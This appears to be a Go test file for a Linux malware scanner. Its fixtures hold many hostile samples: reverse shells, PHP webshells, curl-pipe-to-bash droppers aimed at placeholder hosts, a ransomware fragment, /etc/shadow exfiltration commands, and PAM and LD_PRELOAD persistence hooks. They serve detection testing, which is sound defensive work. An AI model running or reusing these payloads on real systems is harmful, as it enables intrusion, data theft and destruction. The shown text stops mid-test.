package scanner_test

import (
	"bytes"
	"math/rand"
	"os"
	"strings"
	"testing"

	"golang.org/x/sys/unix"

	"aether/internal/config"
	"aether/internal/report"
	"aether/internal/scanner"
)

func TestCheckELFInTempOrDev(t *testing.T) {
	elfHeader := []byte{0x7f, 'E', 'L', 'F', 0x02, 0x01, 0x01, 0x00}
	nonELFHeader := []byte{'#', '!', '/', 'b', 'i', 'n', '/', 's', 'h'}
	cfg := config.NewDefaultConfig()

	// 1. Non-ELF file in /tmp -> should not match
	if m := scanner.CheckELFInTempOrDev("/tmp/script.sh", nonELFHeader, 0755, 0, false, cfg); m != nil {
		t.Errorf("expected nil for non-ELF, got %+v", m)
	}

	// 2. Executable ELF in /tmp without extra signals (owned by root uid=0) -> WARNING (score 55)
	m1 := scanner.CheckELFInTempOrDev("/tmp/test_elf", elfHeader, 0755, 0, false, cfg)
	if m1 == nil || m1.Severity != report.SeverityWarning || m1.Score != 55 {
		t.Errorf("expected WARNING (55) for standard ELF in /tmp, got: %+v", m1)
	}

	// 3. ELF in /tmp with hidden name + executable bit -> Escalated to ALERT (score 85)
	m2 := scanner.CheckELFInTempOrDev("/tmp/.hidden_elf", elfHeader, 0755, 0, false, cfg)
	if m2 == nil || m2.Severity != report.SeverityAlert || m2.Score != 85 {
		t.Errorf("expected ALERT (85) for hidden executable ELF in /tmp, got: %+v", m2)
	}

	// 4. ELF in /tmp with other signal (e.g. IOC hit) -> Escalated to ALERT (score 85)
	m3 := scanner.CheckELFInTempOrDev("/tmp/normal_name", elfHeader, 0644, 0, true, cfg)
	if m3 == nil || m3.Severity != report.SeverityAlert || m3.Score != 85 {
		t.Errorf("expected ALERT (85) for ELF in /tmp with other signal, got: %+v", m3)
	}

	// 5. ELF regular file in /dev -> ALERT (score 85)
	m4 := scanner.CheckELFInTempOrDev("/dev/fake_char", elfHeader, 0755, 0, false, cfg)
	if m4 == nil || m4.Severity != report.SeverityAlert || m4.Score != 85 {
		t.Errorf("expected ALERT (85) for regular ELF file in /dev, got: %+v", m4)
	}

	// 6. Executable ELF in /dev/shm -> WARNING (score 55)
	m5 := scanner.CheckELFInTempOrDev("/dev/shm/miner", elfHeader, 0755, 0, false, cfg)
	if m5 == nil || m5.Severity != report.SeverityWarning || m5.Score != 55 {
		t.Errorf("expected WARNING (55) for ELF in /dev/shm, got: %+v", m5)
	}

	// 7. Non-executable ELF in /tmp owned by current invoking non-root user -> NOTICE (score 25)
	currentUID := uint32(os.Getuid())
	m6 := scanner.CheckELFInTempOrDev("/tmp/cached_lib.so", elfHeader, 0644, currentUID, false, cfg)
	if os.Geteuid() != 0 {
		if m6 == nil || m6.Severity != report.SeverityNotice || m6.Score != 25 {
			t.Errorf("expected NOTICE (25) for non-executable ELF owned by non-root user in /tmp, got: %+v", m6)
		}
	}

	// 8. Non-executable ELF in /tmp owned by current non-root user BUT with IOC signal -> Escalated to ALERT (score 85)
	m7 := scanner.CheckELFInTempOrDev("/tmp/cached_lib.so", elfHeader, 0644, currentUID, true, cfg)
	if m7 == nil || m7.Severity != report.SeverityAlert || m7.Score != 85 {
		t.Errorf("expected ALERT (85) for non-executable ELF with IOC match in /tmp, got: %+v", m7)
	}
}

func TestCheckHiddenExecutableInSystemDirs(t *testing.T) {
	cfg := config.NewDefaultConfig()

	// 1. Non-executable hidden file in /usr/bin -> nil
	if m := scanner.CheckHiddenExecutableInSystemDirs("/usr/bin/.hidden", 0644, cfg); m != nil {
		t.Errorf("expected nil for non-executable, got %+v", m)
	}

	// 2. Normal executable in /usr/bin -> nil
	if m := scanner.CheckHiddenExecutableInSystemDirs("/usr/bin/cat", 0755, cfg); m != nil {
		t.Errorf("expected nil for normal binary, got %+v", m)
	}

	// 3. Hidden executable in /usr/bin -> WARNING (score 65)
	m := scanner.CheckHiddenExecutableInSystemDirs("/usr/bin/.stealth", 0755, cfg)
	if m == nil || m.Severity != report.SeverityWarning || m.Score != 65 {
		t.Errorf("expected WARNING (65) for hidden executable in /usr/bin, got: %+v", m)
	}

	// 4. Hidden executable in /home/user -> nil (not system dir)
	if m := scanner.CheckHiddenExecutableInSystemDirs("/home/user/.bashrc", 0755, cfg); m != nil {
		t.Errorf("expected nil for user directory, got %+v", m)
	}
}

func TestCheckSuspiciousSUID(t *testing.T) {
	cfg := config.NewDefaultConfig()

	// 1. SUID in standard path /usr/bin/passwd -> nil
	suidMode := uint32(unix.S_ISUID | 0755)
	if m := scanner.CheckSuspiciousSUID("/usr/bin/passwd", suidMode, cfg); m != nil {
		t.Errorf("expected nil for standard SUID /usr/bin/passwd, got %+v", m)
	}

	// 2. Non-SUID in /tmp -> nil
	if m := scanner.CheckSuspiciousSUID("/tmp/tool", 0755, cfg); m != nil {
		t.Errorf("expected nil for non-SUID file, got %+v", m)
	}

	// 3. SUID executable in /tmp/rootshell -> ALERT (score 85)
	m := scanner.CheckSuspiciousSUID("/tmp/rootshell", suidMode, cfg)
	if m == nil || m.Severity != report.SeverityAlert || m.Score != 85 {
		t.Errorf("expected ALERT (85) for SUID file in /tmp, got: %+v", m)
	}
}

func TestCheckWorldWritableInEtc(t *testing.T) {
	cfg := config.NewDefaultConfig()

	// 1. Normal permissions in /etc/hosts (0644) -> nil
	if m := scanner.CheckWorldWritableInEtc("/etc/hosts", 0644, cfg); m != nil {
		t.Errorf("expected nil for 0644 in /etc, got %+v", m)
	}

	// 2. World writable in /tmp (0666) -> nil (not in /etc)
	if m := scanner.CheckWorldWritableInEtc("/tmp/scratch", 0666, cfg); m != nil {
		t.Errorf("expected nil for /tmp, got %+v", m)
	}

	// 3. World writable in /etc/cron.d/job (0666) -> WARNING (score 60)
	m := scanner.CheckWorldWritableInEtc("/etc/cron.d/job", 0666, cfg)
	if m == nil || m.Severity != report.SeverityWarning || m.Score != 60 {
		t.Errorf("expected WARNING (60) for world-writable file in /etc, got: %+v", m)
	}
}

func TestCheckSuspiciousPrivateKeyMaterial(t *testing.T) {
	cfg := config.NewDefaultConfig()

	openSSHKey := []byte("-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW\n-----END OPENSSH PRIVATE KEY-----\n")
	rsaKey := []byte("-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEA0Y3...\n-----END RSA PRIVATE KEY-----\n")
	plainText := []byte("This is a normal log file with no private key data.\n")

	// 1. Planted OpenSSH key in /usr/lib/.system-cache/id_ed25519 -> WARNING (score 70)
	m1 := scanner.CheckSuspiciousPrivateKeyMaterial("/usr/lib/.system-cache/id_ed25519", openSSHKey, nil, cfg)
	if m1 == nil || m1.Severity != report.SeverityWarning || m1.Score != 70 || m1.Name != "File_Suspicious_Private_Key_Location" {
		t.Errorf("expected File_Suspicious_Private_Key_Location WARNING for /usr/lib/.system-cache/id_ed25519, got: %+v", m1)
	}

	// 2. Planted RSA key in /etc/.hidden/id_rsa -> WARNING (score 70)
	m2 := scanner.CheckSuspiciousPrivateKeyMaterial("/etc/.hidden/id_rsa", rsaKey, nil, cfg)
	if m2 == nil || m2.Severity != report.SeverityWarning || m2.Score != 70 {
		t.Errorf("expected File_Suspicious_Private_Key_Location WARNING for /etc/.hidden/id_rsa, got: %+v", m2)
	}

	// 3. Legitimate host key in /etc/ssh/ssh_host_ed25519_key -> nil
	if m := scanner.CheckSuspiciousPrivateKeyMaterial("/etc/ssh/ssh_host_ed25519_key", openSSHKey, nil, cfg); m != nil {
		t.Errorf("expected nil for standard /etc/ssh host key, got: %+v", m)
	}

	// 4. Legitimate user key in /root/.ssh/id_ed25519 -> nil
	if m := scanner.CheckSuspiciousPrivateKeyMaterial("/root/.ssh/id_ed25519", openSSHKey, nil, cfg); m != nil {
		t.Errorf("expected nil for /root/.ssh/id_ed25519, got: %+v", m)
	}

	// 5. Legitimate user key in /home/alice/.ssh/id_rsa -> nil
	if m := scanner.CheckSuspiciousPrivateKeyMaterial("/home/alice/.ssh/id_rsa", rsaKey, nil, cfg); m != nil {
		t.Errorf("expected nil for /home/alice/.ssh/id_rsa, got: %+v", m)
	}

	// 6. Tiny key file (under 200 bytes) -> evaluated normally
	tinyKey := []byte("-----BEGIN PRIVATE KEY-----\nMC4CAQAwBQYDK2VwBCIEIP...\n-----END PRIVATE KEY-----\n")
	m6 := scanner.CheckSuspiciousPrivateKeyMaterial("/usr/lib/.system-cache/tiny_key", tinyKey, nil, cfg)
	if m6 == nil || m6.Severity != report.SeverityWarning {
		t.Errorf("expected WARNING for tiny key file, got: %+v", m6)
	}

	// 7. Non-key text file in hidden path -> nil
	if m := scanner.CheckSuspiciousPrivateKeyMaterial("/usr/lib/.system-cache/log.txt", plainText, nil, cfg); m != nil {
		t.Errorf("expected nil for non-key file, got: %+v", m)
	}
}

func TestCheckSuspiciousScriptContent(t *testing.T) {
	cfg := config.NewDefaultConfig()

	// 1. User's exact reverse shell payload
	userRevShell := []byte("sh -i >& /dev/tcp/192.168.1.18/4444 0>&1\n")
	m1 := scanner.CheckSuspiciousScriptContent("/home/nick/Music/real.sh", userRevShell, nil, cfg)
	if m1 == nil || m1.Severity != report.SeverityAlert || m1.Name != "Script_Reverse_Shell_Interactive" {
		t.Errorf("expected Script_Reverse_Shell_Interactive ALERT for user's real.sh, got: %+v", m1)
	}

	// 2. Standard bash reverse shell
	bashRevShell := []byte("/bin/bash -i >& /dev/tcp/10.0.0.1/9001 0>&1\n")
	m2 := scanner.CheckSuspiciousScriptContent("/tmp/shell.sh", bashRevShell, nil, cfg)
	if m2 == nil || m2.Severity != report.SeverityAlert || m2.Name != "Script_Reverse_Shell_Interactive" {
		t.Errorf("expected Script_Reverse_Shell_Interactive ALERT for bash rev shell, got: %+v", m2)
	}

	// 3. Exec fd redirection reverse shell
	execRevShell := []byte("exec 5<>/dev/tcp/10.0.0.1/4242; cat <&5 | while read line; do $line 2>&5 >&5; done\n")
	m3 := scanner.CheckSuspiciousScriptContent("/tmp/backdoor.sh", execRevShell, nil, cfg)
	if m3 == nil || m3.Severity != report.SeverityAlert || m3.Name != "Script_Reverse_Shell_Interactive" {
		t.Errorf("expected Script_Reverse_Shell_Interactive ALERT for exec fd reverse shell, got: %+v", m3)
	}

	// 4. Netcat reverse shell with -e
	ncRevShell := []byte("nc -e /bin/bash 192.168.1.1 4444\n")
	m4 := scanner.CheckSuspiciousScriptContent("/tmp/nc.sh", ncRevShell, nil, cfg)
	if m4 == nil || m4.Severity != report.SeverityAlert || m4.Name != "Script_Netcat_Reverse_Shell" {
		t.Errorf("expected Script_Netcat_Reverse_Shell ALERT for nc -e, got: %+v", m4)
	}

	// 5. Socat reverse shell
	socatRevShell := []byte("socat TCP:192.168.1.1:4444 EXEC:/bin/sh\n")
	m5 := scanner.CheckSuspiciousScriptContent("/tmp/socat.sh", socatRevShell, nil, cfg)
	if m5 == nil || m5.Severity != report.SeverityAlert || m5.Name != "Script_Socat_Reverse_Shell" {
		t.Errorf("expected Script_Socat_Reverse_Shell ALERT for socat, got: %+v", m5)
	}

	// 6. Python inline socket reverse shell
	pyRevShell := []byte("python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"10.0.0.1\",4444));os.dup2(s.fileno(),0);pty.spawn(\"/bin/bash\")'\n")
	m6 := scanner.CheckSuspiciousScriptContent("/tmp/py.sh", pyRevShell, nil, cfg)
	if m6 == nil || m6.Severity != report.SeverityAlert || m6.Name != "Script_Reverse_Shell_Inline" {
		t.Errorf("expected Script_Reverse_Shell_Inline ALERT for python rev shell, got: %+v", m6)
	}

	// 7. Generic PHP webshell
	phpWebshell := []byte("<?php eval(base64_decode($_POST['c'])); ?>\n")
	m7 := scanner.CheckSuspiciousScriptContent("/var/www/html/shell.php", phpWebshell, nil, cfg)
	if m7 == nil || m7.Severity != report.SeverityAlert || m7.Name != "Webshell_PHP_Generic_Backdoor" {
		t.Errorf("expected Webshell_PHP_Generic_Backdoor ALERT for PHP webshell, got: %+v", m7)
	}

	// 8. Download and execute dropper
	dropper := []byte("curl -sSL https://evil.example.com/payload.sh | bash\n")
	m8 := scanner.CheckSuspiciousScriptContent("/tmp/install.sh", dropper, nil, cfg)
	if m8 == nil || m8.Severity != report.SeverityWarning || m8.Name != "Script_Download_And_Execute" {
		t.Errorf("expected Script_Download_And_Execute WARNING for dropper, got: %+v", m8)
	}

	// 9. Parameterized reverse shell with variables/quotes (kraken3 pattern)
	paramRevShell := []byte("exec 5<>/dev/tcp/\"${IP}\"/\"${PORT}\"; cat <&5 | while read line; do $line 2>&5 >&5; done\n")
	m9 := scanner.CheckSuspiciousScriptContent("/home/nick/Music/implant.sh", paramRevShell, nil, cfg)
	if m9 == nil || m9.Severity != report.SeverityAlert || m9.Name != "Script_Reverse_Shell_Interactive" {
		t.Errorf("expected Script_Reverse_Shell_Interactive ALERT for parameterized rev shell, got: %+v", m9)
	}

	// 10. OpenSSL encrypted reverse shell (kraken3 pattern)
	opensslRevShell := []byte("openssl s_client -quiet -connect \"${IP}:${PORT}\" < /tmp/.gs_pipe_$$ | /bin/bash > /tmp/.gs_pipe_$$ 2>&1\n")
	m10 := scanner.CheckSuspiciousScriptContent("/tmp/openssl_shell.sh", opensslRevShell, nil, cfg)
	if m10 == nil || m10.Severity != report.SeverityAlert || m10.Name != "Script_OpenSSL_Reverse_Shell" {
		t.Errorf("expected Script_OpenSSL_Reverse_Shell ALERT for openssl s_client pipe, got: %+v", m10)
	}

	// 11. Procfs tmpfs hiding (kraken3 stealth pattern)
	procHiding := []byte("mount -t tmpfs -o size=1M tmpfs \"/proc/${pid}\"\n")
	m11 := scanner.CheckSuspiciousScriptContent("/tmp/hide_proc.sh", procHiding, nil, cfg)
	if m11 == nil || m11.Severity != report.SeverityAlert || m11.Name != "Script_Process_Hiding_Procfs" {
		t.Errorf("expected Script_Process_Hiding_Procfs ALERT for procfs tmpfs hiding, got: %+v", m11)
	}

	// 12. Webshell behavioral traits (login hash + management functions)
	webshellTraits := []byte("<?php $password = 'd0763edaa9d9bd2a9516280e9044d885'; if(md5($_POST['pass']) == $password) { run_panel(); } function run_panel() { system('id'); } ?>\n")
	m12 := scanner.CheckSuspiciousScriptContent("/var/www/html/wso.php", webshellTraits, nil, cfg)
	if m12 == nil || m12.Severity != report.SeverityWarning || m12.Name != "Script_Webshell_Traits" {
		t.Errorf("expected Script_Webshell_Traits WARNING for webshell traits, got: %+v", m12)
	}

	// 13. Benign script
	benignScript := []byte("#!/bin/bash\necho 'Hello World'\nls -la /var/log\n")
	m13 := scanner.CheckSuspiciousScriptContent("/home/nick/script.sh", benignScript, nil, cfg)
	if m13 != nil {
		t.Errorf("expected nil for benign script, got: %+v", m13)
	}

	// 14. Python ransomware encryptor / locker
	ransomScript := []byte("from cryptography.fernet import Fernet\nimport os\nkey = Fernet.generate_key()\nf = Fernet(key)\nfor root, dirs, files in os.walk('/home/user'):\n    for file in files:\n        path = os.path.join(root, file)\n        with open(path, 'rb') as f_in:\n            enc = f.encrypt(f_in.read())\n        os.remove(path)\n")
	m14 := scanner.CheckSuspiciousScriptContent("/tmp/ransom.py", ransomScript, nil, cfg)
	if m14 == nil || m14.Severity != report.SeverityAlert || m14.Name != "Script_Python_Ransomware_Encryptor" {
		t.Errorf("expected Script_Python_Ransomware_Encryptor ALERT for ransomware script, got: %+v", m14)
	}

	// 15. Python data exfiltration stealer
	exfilScript := []byte("import socket, os, zlib, json\ns = socket.create_connection(('10.96.88.135', 4444))\nTARGET_DIR = '/home/user/docs'\nfor root, dirs, files in os.walk(TARGET_DIR):\n    data = zlib.compress(json.dumps(files).encode())\n    s.sendall(data)\n")
	m15 := scanner.CheckSuspiciousScriptContent("/tmp/exfil.py", exfilScript, nil, cfg)
	if m15 == nil || m15.Severity != report.SeverityAlert || m15.Name != "Script_Data_Exfiltration_Stealer" {
		t.Errorf("expected Script_Data_Exfiltration_Stealer ALERT for exfil script, got: %+v", m15)
	}

	// 17. Benign Python package metadata containing curl | bash example
	metaData := []byte("Metadata-Version: 2.1\nName: elasticsearch\nDescription: Install via curl -sSL https://elastic.co/install.sh | bash\n")
	m17 := scanner.CheckSuspiciousScriptContent("/usr/lib/python3/dist-packages/elasticsearch-9.5.0.dist-info/METADATA", metaData, nil, cfg)
	if m17 != nil {
		t.Errorf("expected nil for benign Python metadata documentation, got: %+v", m17)
	}

	// 18. Benign unit test fixture containing mock server
	testMock := []byte("import unittest, socket\nclass TestServer(unittest.TestCase):\n    def test_mock(self):\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        s.bind(('127.0.0.1', 0))\n        s.listen(1)\n")
	m18 := scanner.CheckSuspiciousScriptContent("/usr/lib/python3/dist-packages/twisted/test/test_fdset.py", testMock, nil, cfg)
	if m18 != nil {
		t.Errorf("expected nil for benign package unit test fixture, got: %+v", m18)
	}

	// 19. PHP webshell variable indirection
	varIndirWebshell := []byte("<?php $cmd = $_POST['c']; eval($cmd); ?>\n")
	m19 := scanner.CheckSuspiciousScriptContent("/var/www/html/indir.php", varIndirWebshell, nil, cfg)
	if m19 == nil || m19.Severity != report.SeverityAlert || m19.Name != "Webshell_PHP_Generic_Backdoor" {
		t.Errorf("expected Webshell_PHP_Generic_Backdoor ALERT for variable indirection webshell, got: %+v", m19)
	}

	// 20. PHP webshell callback execution
	callbackWebshell := []byte("<?php call_user_func('system', $_GET['x']); ?>\n")
	m20 := scanner.CheckSuspiciousScriptContent("/var/www/html/cb.php", callbackWebshell, nil, cfg)
	if m20 == nil || m20.Severity != report.SeverityAlert || m20.Name != "Webshell_PHP_Generic_Backdoor" {
		t.Errorf("expected Webshell_PHP_Generic_Backdoor ALERT for callback webshell, got: %+v", m20)
	}

	// 21. Awk reverse shell
	awkRevShell := []byte("awk 'BEGIN {s = \"/inet/tcp/0/10.0.0.1/4444\"; while (42) { do{ printf \"shell>\" |& s; s |& getline c; } while (c != \"exit\") close(s); }}'\n")
	m21 := scanner.CheckSuspiciousScriptContent("/tmp/awk_rev.sh", awkRevShell, nil, cfg)
	if m21 == nil || m21.Severity != report.SeverityAlert || m21.Name != "Script_Reverse_Shell_Inline" {
		t.Errorf("expected Script_Reverse_Shell_Inline ALERT for awk reverse shell, got: %+v", m21)
	}

	// 22. Socat openssl-connect reverse shell
	socatSSL := []byte("socat openssl-connect:10.0.0.1:443,verify=0 exec:/bin/bash\n")
	m22 := scanner.CheckSuspiciousScriptContent("/tmp/socat_ssl.sh", socatSSL, nil, cfg)
	if m22 == nil || m22.Severity != report.SeverityAlert || m22.Name != "Script_Socat_Reverse_Shell" {
		t.Errorf("expected Script_Socat_Reverse_Shell ALERT for socat ssl rev shell, got: %+v", m22)
	}

	// 23. Netcat named pipe reverse shell
	ncPipe := []byte("mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.1 1234 > /tmp/f\n")
	m23 := scanner.CheckSuspiciousScriptContent("/tmp/nc_pipe.sh", ncPipe, nil, cfg)
	if m23 == nil || m23.Severity != report.SeverityAlert || m23.Name != "Script_Netcat_Reverse_Shell" {
		t.Errorf("expected Script_Netcat_Reverse_Shell ALERT for netcat fifo pipe, got: %+v", m23)
	}

	// 24. Procfs bind mount hiding
	procBind := []byte("mount --bind /tmp/empty /proc/1234\n")
	m24 := scanner.CheckSuspiciousScriptContent("/tmp/hide_bind.sh", procBind, nil, cfg)
	if m24 == nil || m24.Severity != report.SeverityAlert || m24.Name != "Script_Process_Hiding_Procfs" {
		t.Errorf("expected Script_Process_Hiding_Procfs ALERT for procfs bind mount, got: %+v", m24)
	}

	// 25. PowerShell encoded command execution
	pwshEncoded := []byte("pwsh -e SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAA=\n")
	m25 := scanner.CheckSuspiciousScriptContent("/tmp/run_pwsh.sh", pwshEncoded, nil, cfg)
	if m25 == nil || m25.Severity != report.SeverityAlert || m25.Name != "Script_PowerShell_Encoded_Execution" {
		t.Errorf("expected Script_PowerShell_Encoded_Execution ALERT, got: %+v", m25)
	}

	// 26. Cloud exfiltration tool (rclone / mega)
	cloudExfil := []byte("rclone sync /etc/shadow remote:exfil_bucket/dump.tar.gz\n")
	m26 := scanner.CheckSuspiciousScriptContent("/tmp/sync_cloud.sh", cloudExfil, nil, cfg)
	if m26 == nil || m26.Severity != report.SeverityWarning || m26.Name != "Script_Cloud_Exfiltration_Tool" {
		t.Errorf("expected Script_Cloud_Exfiltration_Tool WARNING, got: %+v", m26)
	}

	// 27. Suspicious PAM execution hook in volatile directory
	pamExec := []byte("auth optional pam_exec.so /tmp/.session_logger.sh\n")
	m27 := scanner.CheckSuspiciousScriptContent("/etc/pam.d/common-auth", pamExec, nil, cfg)
	if m27 == nil || m27.Severity != report.SeverityAlert || m27.Name != "Persistence_PAM_Exec_Suspicious" {
		t.Errorf("expected Persistence_PAM_Exec_Suspicious ALERT, got: %+v", m27)
	}

	// 28. Dynamic Linker Audit Interface hijack
	linkerAudit := []byte("export LD_AUDIT=/opt/stealth/libaudit.so\n")
	m28 := scanner.CheckSuspiciousScriptContent("/etc/profile.d/audit.sh", linkerAudit, nil, cfg)
	if m28 == nil || m28.Severity != report.SeverityAlert || m28.Name != "Persistence_Linker_Audit_Hijack" {
		t.Errorf("expected Persistence_Linker_Audit_Hijack ALERT, got: %+v", m28)
	}

	// 29. Loosened dropper (curl --retry 3 | sudo bash -c)
	dropperCurl := []byte("curl --retry 3 -sSL https://threat.com/loader.sh | sudo bash -c\n")
	m29 := scanner.CheckSuspiciousScriptContent("/tmp/drop.sh", dropperCurl, nil, cfg)
	if m29 == nil || m29.Severity != report.SeverityWarning || m29.Name != "Script_Download_And_Execute" {
		t.Errorf("expected Script_Download_And_Execute WARNING for curl --retry pipe, got: %+v", m29)
	}

	// 30. Loosened dropper (busybox wget | sh)
	dropperBusybox := []byte("busybox wget -q -O- http://192.168.1.50/mal | sh\n")
	m30 := scanner.CheckSuspiciousScriptContent("/tmp/bb_drop.sh", dropperBusybox, nil, cfg)
	if m30 == nil || m30.Severity != report.SeverityWarning || m30.Name != "Script_Download_And_Execute" {
		t.Errorf("expected Script_Download_And_Execute WARNING for busybox wget pipe, got: %+v", m30)
	}

	// 31. Hardened dropper (curl -fSsL | sudo bash)
	dropperCurlFs := []byte("curl -fSsL https://threat.com/loader.sh | sudo bash\n")
	m31 := scanner.CheckSuspiciousScriptContent("/tmp/drop2.sh", dropperCurlFs, nil, cfg)
	if m31 == nil || m31.Severity != report.SeverityWarning || m31.Name != "Script_Download_And_Execute" {
		t.Errorf("expected Script_Download_And_Execute WARNING for curl -fSsL pipe, got: %+v", m31)
	}

	// 32. Hardened dropper (fetch -o - | sh -s)
	dropperFetch := []byte("fetch -o - https://evil.org/stage1 | sh -s\n")
	m32 := scanner.CheckSuspiciousScriptContent("/tmp/fetch.sh", dropperFetch, nil, cfg)
	if m32 == nil || m32.Severity != report.SeverityWarning || m32.Name != "Script_Download_And_Execute" {
		t.Errorf("expected Script_Download_And_Execute WARNING for fetch pipe, got: %+v", m32)
	}

	// 33. Hardened dropper (aria2c | bash)
	dropperAria := []byte("aria2c -s1 https://mal.com/x.sh -o- | bash\n")
	m33 := scanner.CheckSuspiciousScriptContent("/tmp/aria.sh", dropperAria, nil, cfg)
	if m33 == nil || m33.Severity != report.SeverityWarning || m33.Name != "Script_Download_And_Execute" {
		t.Errorf("expected Script_Download_And_Execute WARNING for aria2c pipe, got: %+v", m33)
	}

	// 34. Linker hook via LD_PRELOAD in script
	linkerPreload := []byte("export LD_PRELOAD=/tmp/libstealth.so\n")
	m34 := scanner.CheckSuspiciousScriptContent("/etc/profile.d/preload.sh", linkerPreload, nil, cfg)
	if m34 == nil || m34.Severity != report.SeverityAlert || m34.Name != "Persistence_Linker_Audit_Hijack" {
		t.Errorf("expected Persistence_Linker_Audit_Hijack ALERT for LD_PRELOAD hook, got: %+v", m34)
	}

	// 35. Linker hook via systemd Environment injection
	linkerEnv := []byte("Environment=\"LD_PRELOAD=/usr/local/lib/hide.so\"\n")
	m35 := scanner.CheckSuspiciousScriptContent("/etc/systemd/system/backdoor.service", linkerEnv, nil, cfg)
	if m35 == nil || m35.Severity != report.SeverityAlert || m35.Name != "Persistence_Linker_Audit_Hijack" {
		t.Errorf("expected Persistence_Linker_Audit_Hijack ALERT for systemd Environment LD_PRELOAD, got: %+v", m35)
	}

	// 36. Cloud exfil tool via s5cmd
	exfilS5 := []byte("s5cmd cp /etc/shadow s3://threat-bucket/\n")
	m36 := scanner.CheckSuspiciousScriptContent("/tmp/exfil_s5.sh", exfilS5, nil, cfg)
	if m36 == nil || m36.Severity != report.SeverityWarning || m36.Name != "Script_Cloud_Exfiltration_Tool" {
		t.Errorf("expected Script_Cloud_Exfiltration_Tool WARNING for s5cmd cp, got: %+v", m36)
	}

	// 37. Suspicious PAM exec hook with arguments
	pamExecArgs := []byte("auth required pam_exec.so seteuid /var/tmp/.hide_logger.sh\n")
	m37 := scanner.CheckSuspiciousScriptContent("/etc/pam.d/sshd", pamExecArgs, nil, cfg)
	if m37 == nil || m37.Severity != report.SeverityAlert || m37.Name != "Persistence_PAM_Exec_Suspicious" {
		t.Errorf("expected Persistence_PAM_Exec_Suspicious ALERT for pam_exec with seteuid, got: %+v", m37)
	}

	// 38. Suspicious PAM exec hook specifically via seteuid argument (non-script, non-tmp path)
	pamExecSeteuid := []byte("auth required pam_exec.so seteuid /usr/local/bin/custom_authenticator\n")
	m38 := scanner.CheckSuspiciousScriptContent("/etc/pam.d/common-auth", pamExecSeteuid, nil, cfg)
	if m38 == nil || m38.Severity != report.SeverityAlert || m38.Name != "Persistence_PAM_Exec_Suspicious" {
		t.Errorf("expected Persistence_PAM_Exec_Suspicious ALERT for pam_exec with seteuid, got: %+v", m38)
	}

	// 39. Dropper pipe in temporary directory disguised as a .txt file (MUST be detected, not suppressed)
	tempDropperDoc := []byte("Run dropper: curl -s https://evil.com/payload.sh | bash\n")
	m39 := scanner.CheckSuspiciousScriptContent("/tmp/dropper.txt", tempDropperDoc, nil, cfg)
	if m39 == nil || m39.Severity != report.SeverityWarning || m39.Name != "Script_Download_And_Execute" {
		t.Errorf("expected Script_Download_And_Execute WARNING for disguised .txt dropper in /tmp, got: %+v", m39)
	}

	// 40. Benign setup command in standard documentation path (MUST be suppressed)
	m40 := scanner.CheckSuspiciousScriptContent("/usr/share/doc/example/setup.txt", tempDropperDoc, nil, cfg)
	if m40 != nil {
		t.Errorf("expected nil for benign setup doc in /usr/share/doc, got: %+v", m40)
	}
}

type mockTestPkgDB struct {
	owned   map[string]string
	digests map[string]string
}

func (m *mockTestPkgDB) Owner(path string) (string, bool) {
	pkg, ok := m.owned[path]
	return pkg, ok
}

func (m *mockTestPkgDB) IsAvailable() bool {
	return true
}

func (m *mockTestPkgDB) StatusNote() string {
	return "mock test db"
}

func (m *mockTestPkgDB) VerifyDigest(path string, actualMD5 string) (bool, string, bool) {
	if m.digests != nil {
		if exp, ok := m.digests[path]; ok {
			return strings.EqualFold(exp, actualMD5), exp, true
		}
	}
	return true, "", false
}

func (m *mockTestPkgDB) PackageCount() int {
	return len(m.owned)
}

func TestCheckSuspiciousScriptContent_PackageOwnedTrojanAndBenign(t *testing.T) {
	cfg := config.NewDefaultConfig()

	trojanPath := "/usr/lib/python3/dist-packages/python3-distro-util/trojan_package_file.py"
	benignPkgPath := "/usr/lib/python3/dist-packages/requests/api.py"
	benignShellPath := "/usr/bin/update-ca-certificates"

	mockDB := &mockTestPkgDB{
		owned: map[string]string{
			trojanPath:      "python3-distro-util",
			benignPkgPath:   "python3-requests",
			benignShellPath: "ca-certificates",
		},
	}

	// 1. Direct malware injected into verified package file -> MUST detect as ALERT and evaluate to MALICIOUS
	trojanContent := []byte("#!/usr/bin/env python3\nimport os\nos.system(\"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\")\n")
	mTrojan := scanner.CheckSuspiciousScriptContent(trojanPath, trojanContent, mockDB, cfg)
	if mTrojan == nil {
		t.Fatalf("expected heuristic match for trojanized package file, got nil")
	}
	if mTrojan.Name != "Script_Reverse_Shell_Interactive" || mTrojan.Severity != report.SeverityAlert {
		t.Errorf("expected Script_Reverse_Shell_Interactive ALERT, got: %+v", mTrojan)
	}

	finding := &report.Finding{
		Path:       trojanPath,
		RuleName:   mTrojan.Name,
		Reason:     mTrojan.Reason,
		Severity:   mTrojan.Severity,
		Confidence: report.ConfidenceHigh,
	}
	verdict := report.DetermineVerdict(finding, mockDB, true, false, false, nil)
	if verdict != report.VerdictMalicious {
		t.Errorf("expected VerdictMalicious for trojanized package file, got: %s", verdict)
	}
	if finding.Severity != report.SeverityAlert {
		t.Errorf("expected SeverityAlert, got: %s", finding.Severity)
	}
	if finding.Confidence != report.ConfidenceHigh {
		t.Errorf("expected ConfidenceHigh, got: %s", finding.Confidence)
	}
	if finding.EvidenceRecord == nil || finding.EvidenceRecord.PackageStatus != "modified_package" {
		t.Errorf("expected PackageStatus 'modified_package', got: %+v", finding.EvidenceRecord)
	}

	// 2. Legitimate package-owned Python library -> MUST produce nil (clean)
	benignPkgContent := []byte("def request(method, url, **kwargs):\n    with sessions.Session() as session:\n        return session.request(method=method, url=url, **kwargs)\n")
	mBenign := scanner.CheckSuspiciousScriptContent(benignPkgPath, benignPkgContent, mockDB, cfg)
	if mBenign != nil {
		t.Errorf("expected nil for benign package code, got: %+v", mBenign)
	}

	// 3. Legitimate package-owned system administrative shell script -> MUST produce nil (clean)
	benignShellContent := []byte("#!/bin/sh\nset -e\necho 'Updating certificates in /etc/ssl/certs...'\n")
